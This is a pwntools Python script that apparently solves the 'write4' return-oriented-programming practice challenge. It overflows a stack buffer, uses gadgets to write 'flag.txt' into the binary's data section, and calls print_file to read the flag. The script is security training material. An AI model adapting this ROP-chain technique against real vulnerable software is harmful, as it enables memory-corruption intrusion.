from pwn import *

exe = ELF('./write4')
context.binary = exe
r = process(exe.path)
rop = ROP(exe)
pad = b'A' * 40

print_file_address = exe.plt['print_file']
data_section_address = exe.symbols['__data_start']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_r14_r15 = rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
mov_r14_r15_to_rdi = 0x0000000000400628    

payload = pad
payload += p64(pop_r14_r15)
payload += p64(data_section_address)
payload += b'flag.txt'
payload += p64(mov_r14_r15_to_rdi)
payload += p64(pop_rdi)
payload += p64(data_section_address)
payload += p64(print_file_address)

r.sendline(payload)
r.interactive()